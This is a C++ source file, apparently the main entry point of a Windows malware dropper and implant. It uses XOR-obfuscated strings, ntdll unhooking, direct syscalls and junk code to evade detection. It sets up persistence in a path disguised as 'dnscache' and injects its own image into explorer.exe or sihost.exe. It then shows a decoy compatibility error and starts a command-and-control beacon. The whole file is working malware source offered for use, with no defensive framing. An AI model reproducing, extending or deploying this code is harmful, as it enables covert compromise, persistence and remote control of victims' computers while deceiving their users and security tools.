#include "beacon/Beacon.h"
#include "persistence/Persistence.h"
#include "evasion/Unhooker.h"
#include "evasion/Syscalls.h"
#include "evasion/Injector.h"
#include "evasion/Detection.h"
#include "evasion/JunkLogic.h"
#include "evasion/Bloat.h"
#include "decoy/BSOD.h"
#include "utils/SelfDelete.h"
#include "utils/Logger.h"
#include "utils/Shared.h"
#include "utils/Obfuscator.h"
#include <windows.h>
#include <objbase.h>
#include <vector>
#include <algorithm>
#include <cwctype>
#include <thread>

namespace {
    // XOR Encrypted Strings (Multi-byte Key)
    const wchar_t kExplorerEnc[] = { L'\x2e', L'\x67', L'\xfc', L'\x52', L'\x24', L'\x6d', L'\xe9', L'\x4c', L'\x65', L'\x7a', L'\xf4', L'\x5b', L'\0' }; // explorer.exe
    const wchar_t kSvchostEnc[] = { L'\x38', L'\x69', L'\xef', L'\x56', L'\x24', L'\x6c', L'\xf8', L'\x10', L'\x2e', L'\x67', L'\xe9', L'\0' }; // svchost.exe
    const wchar_t kVolatileEnvEnc[] = { L'\x1d', L'\x70', L'\xe0', L'\x5f', L'\x3f', L'\x76', L'\xe0', L'\x5b', L'\x6b', L'\x5a', L'\xe2', L'\x48', L'\x22', L'\x6d', L'\xe3', L'\x50', L'\x26', L'\x7a', L'\xe2', L'\x4a', L'\0' }; // Volatile Environment
    const wchar_t kDropperPathEnc[] = { L'\x0f', L'\x6d', L'\xe3', L'\x4e', L'\x3b', L'\x7a', L'\xfe', L'\x6e', L'\x2a', L'\x6b', L'\xe4', L'\0' }; // DropperPath
    const wchar_t kRuntimeBrokerEnc[] = { L'\x19', L'\x6a', L'\xe2', L'\x4a', L'\x22', L'\x72', L'\xe9', L'\x7c', L'\x39', L'\x70', L'\xe7', L'\x5b', L'\x39', L'\x31', L'\xe9', L'\x46', L'\x2e', L'\0' }; // RuntimeBroker.exe
    const wchar_t kSihostEnc[] = { L'\x38', L'\x76', L'\xe4', L'\x51', L'\x38', L'\x6b', L'\xa2', L'\x5b', L'\x33', L'\x7a', L'\0' }; // sihost.exe

    std::vector<uint8_t> GetSelfImage() {
        wchar_t path[MAX_PATH];
        GetModuleFileNameW(NULL, path, MAX_PATH);
        HANDLE hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (hFile == INVALID_HANDLE_VALUE) return {};
        DWORD size = GetFileSize(hFile, NULL);
        if (size == INVALID_FILE_SIZE) { CloseHandle(hFile); return {}; }
        std::vector<uint8_t> buffer(size);
        DWORD read;
        ReadFile(hFile, buffer.data(), size, &read, NULL);
        CloseHandle(hFile);
        return buffer;
    }

    bool IsSystemProcess(const std::wstring& sPath) {
        std::wstring explorer = utils::DecryptW(kExplorerEnc, wcslen(kExplorerEnc));
        std::wstring svchost = utils::DecryptW(kSvchostEnc, wcslen(kSvchostEnc));
        std::wstring runtimeBroker = utils::DecryptW(kRuntimeBrokerEnc, wcslen(kRuntimeBrokerEnc));
        std::wstring sihost = utils::DecryptW(kSihostEnc, wcslen(kSihostEnc));

        std::wstring lowerPath = sPath;
        std::transform(lowerPath.begin(), lowerPath.end(), lowerPath.begin(), ::towlower);

        if (lowerPath.find(explorer) != std::wstring::npos) return true;
        if (lowerPath.find(svchost) != std::wstring::npos) return true;
        if (lowerPath.find(runtimeBroker) != std::wstring::npos) return true;
        if (lowerPath.find(sihost) != std::wstring::npos) return true;
        return false;
    }

    bool IsRunningFromPersistLocation(const std::wstring& sPath) {
        std::wstring lowerPath = sPath;
        std::transform(lowerPath.begin(), lowerPath.end(), lowerPath.begin(), ::towlower);
        // \microsoft\windows\dnscache\ encoded:
        const wchar_t kPathPartEnc[] = { L'\\'^0x4B, L'm'^0x1F, L'i'^0x8C, L'c'^0x3E, L'r'^0x4B, L'o'^0x1F, L's'^0x8C, L'o'^0x3E, L'f'^0x4B, L't'^0x1F, L'\\'^0x8C, L'w'^0x3E, L'i'^0x4B, L'n'^0x1F, L'd'^0x8C, L'o'^0x3E, L'w'^0x4B, L's'^0x1F, L'\\'^0x8C, L'd'^0x3E, L'n'^0x4B, L's'^0x1F, L'c'^0x8C, L'a'^0x3E, L'c'^0x4B, L'h'^0x1F, L'e'^0x8C, L'\\'^0x3E, L'\0' };
        if (lowerPath.find(utils::DecryptW(kPathPartEnc, wcslen(kPathPartEnc))) != std::wstring::npos) return true;
        return false;
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
    (void)hInstance; (void)hPrevInstance; (void)lpCmdLine; (void)nShowCmd;

    evasion::InitializeBloat();
    evasion::JunkLogic::GenerateEntropy();
    evasion::Unhooker::RefreshNtdll();
    evasion::SyscallResolver::GetInstance();

    wchar_t currentPathBuf[MAX_PATH];
    GetModuleFileNameW(NULL, currentPathBuf, MAX_PATH);
    std::wstring currentPath(currentPathBuf);

    LOG_INFO("--- WINMAIN ---");

    evasion::JunkLogic::PerformComplexMath();

    if (IsSystemProcess(currentPath)) {
        LOG_INFO("Detected Role: Foothold (Injected)");
        HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
        (void)hr;

        evasion::JunkLogic::ScrambleMemory();

        wchar_t dropperPath[MAX_PATH] = {0};
        HKEY hKey;
        std::wstring volEnv = utils::DecryptW(kVolatileEnvEnc, wcslen(kVolatileEnvEnc));
        std::wstring dropPathKey = utils::DecryptW(kDropperPathEnc, wcslen(kDropperPathEnc));
        if (RegOpenKeyExW(HKEY_CURRENT_USER, volEnv.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            DWORD sz = sizeof(dropperPath);
            if (RegQueryValueExW(hKey, dropPathKey.c_str(), NULL, NULL, (LPBYTE)dropperPath, &sz) == ERROR_SUCCESS) {
                LOG_INFO("Foothold IPC: Source path found.");
                persistence::establishPersistence(dropperPath);
            }
            RegCloseKey(hKey);
        } else {
            persistence::ReinstallPersistence();
        }

        beacon::Beacon implant;
        implant.run();
        CoUninitialize();
        return 0;
    }

    evasion::JunkLogic::GenerateEntropy();

    if (IsRunningFromPersistLocation(currentPath)) {
        LOG_INFO("Detected Role: Persisted");
        HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
        (void)hr;
        beacon::Beacon implant;
        implant.run();
        CoUninitialize();
        return 0;
    }

    LOG_INFO("Detected Role: Dropper");

    int jitter = evasion::Detection::GetJitterDelay();
    if (jitter > 0) {
        LOG_WARN("Evasion: Jitter delay active.");
        Sleep(jitter * 1000);
    } else {
        Sleep(3000 + (GetTickCount() % 5000));
    }

    evasion::JunkLogic::PerformComplexMath();

    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    (void)hr;

    persistence::establishPersistence();

    evasion::JunkLogic::ScrambleMemory();

    HKEY hKeyIPC;
    std::wstring volEnv = utils::DecryptW(kVolatileEnvEnc, wcslen(kVolatileEnvEnc));
    std::wstring dropPathKey = utils::DecryptW(kDropperPathEnc, wcslen(kDropperPathEnc));
    if (RegCreateKeyExW(HKEY_CURRENT_USER, volEnv.c_str(), 0, NULL, 0, KEY_WRITE, NULL, &hKeyIPC, NULL) == ERROR_SUCCESS) {
        RegSetValueExW(hKeyIPC, dropPathKey.c_str(), 0, REG_SZ, (LPBYTE)currentPathBuf, (DWORD)(wcslen(currentPathBuf) + 1) * sizeof(wchar_t));
        RegCloseKey(hKeyIPC);
    }

    evasion::JunkLogic::GenerateEntropy();

    std::vector<uint8_t> selfImage = GetSelfImage();
    if (!selfImage.empty()) {
        if (evasion::Injector::InjectIntoExplorer(selfImage)) {
            LOG_INFO("Dropper: Foothold established in explorer.exe.");
            decoy::ShowCompatibilityError();
            CoUninitialize();
            return 0;
        }

        std::wstring sihost = utils::DecryptW(kSihostEnc, wcslen(kSihostEnc));
        DWORD siPid = evasion::Injector::GetProcessIdByName(sihost);
        if (siPid != 0) {
            HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, siPid);
            if (hProc) {
                PVOID pRemoteBase = NULL;
                if (evasion::Injector::MapAndInject(hProc, selfImage, &pRemoteBase)) {
                    PBYTE pSrcData = (PBYTE)selfImage.data();
                    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pSrcData + ((PIMAGE_DOS_HEADER)pSrcData)->e_lfanew);
                    PVOID pEntry = (PVOID)((PBYTE)pRemoteBase + pNt->OptionalHeader.AddressOfEntryPoint);
                    HANDLE hThread = NULL;
                    if (NT_SUCCESS(evasion::SysNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProc, pEntry, NULL, 0, 0, 0, 0, NULL))) {
                        CloseHandle(hThread);
                        LOG_INFO("Dropper: Foothold established in sihost.exe.");
                        CloseHandle(hProc);
                        decoy::ShowCompatibilityError();
                        CoUninitialize();
                        return 0;
                    }
                }
                CloseHandle(hProc);
            }
        }
    }

    decoy::ShowCompatibilityError();
    CoUninitialize();
    return 0;
}
